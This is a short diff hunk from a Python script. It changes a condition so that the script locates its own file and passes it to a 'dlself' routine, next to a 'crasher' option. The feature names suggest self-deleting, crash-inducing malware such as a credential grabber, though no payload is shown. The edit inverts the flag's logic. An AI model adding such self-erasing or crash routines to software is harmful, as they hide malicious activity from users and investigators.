@@ -2285,7 +2285,7 @@ def gatha():
     if crasher == True:
         crashs()
         
-    if melter != False:
+    if melter == False:
         srcss = os.path.realpath(__file__)
         dlself(srcss)
 
